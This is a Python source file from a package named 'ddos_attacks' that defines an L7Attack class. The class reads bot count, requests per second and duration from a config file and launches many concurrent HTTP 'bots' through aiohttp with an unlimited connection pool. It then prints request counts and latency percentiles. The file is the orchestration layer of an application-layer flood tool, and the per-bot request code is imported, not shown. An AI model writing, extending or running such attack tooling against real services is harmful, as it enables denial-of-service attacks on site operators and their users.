import time
import asyncio
import aiohttp
import statistics
from aiolimiter import AsyncLimiter
from ddos_attacks.utils import load_config, percentile
from ddos_attacks.bots.l7_bot import L7Bot

ddos_config = load_config("ddos.json")
BOTS_COUNT = ddos_config["l7"]["BOTS_COUNT"]
RPS = ddos_config["l7"]["RPS"]
DURATION = ddos_config["l7"]["DURATION"]


class L7Attack:
    def __init__(self):
        self.bots_count = BOTS_COUNT
        self.rps = RPS
        self.duration = DURATION
        self.stats = {
            "response_times": [],
            "http_codes": [],
            "errors_count": 0
        }

    async def attack(self):
        limiter = AsyncLimiter(self.rps, 1)
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(limit=0)
        stop_time = time.time() + self.duration

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = []
            for i in range(self.bots_count):
                bot = L7Bot(i)
                tasks.append(asyncio.create_task(bot.job(session, limiter, self.stats, stop_time)))
            await asyncio.gather(*tasks, return_exceptions=True)

    def attack_statistic(self):
        if self.stats["response_times"]:
            print("Requests:", len(self.stats['response_times']))
            print("Errors:", self.stats['errors_count'])
            print("p50:", statistics.median(self.stats['response_times']))
            print("p95:", percentile(self.stats['response_times'], 95))
            print("p99:", percentile(self.stats['response_times'], 99))
        else:
            print("No successful requests recorded.")